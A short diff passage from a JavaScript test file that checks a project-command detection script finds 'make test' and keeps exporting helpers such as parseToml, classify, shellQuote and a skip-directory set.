+  assert.deepEqual(cmds(detect(dir), 'test'), ['make test']);
+});
+
+test('exports used by other scripts stay available', async () => {
+  const mod = await import('../scripts/detect.mjs');
+  for (const name of ['detect', 'parseToml', 'classify', 'classifyCommand', 'walk', 'createContext', 'SKIP_DIRS', 'MAX_DEPTH', 'shellQuote']) {
+    assert.ok(name in mod, name);
+  }
+  assert.ok(mod.SKIP_DIRS.has('.yarn') && mod.SKIP_DIRS.has('node_modules'));
 });
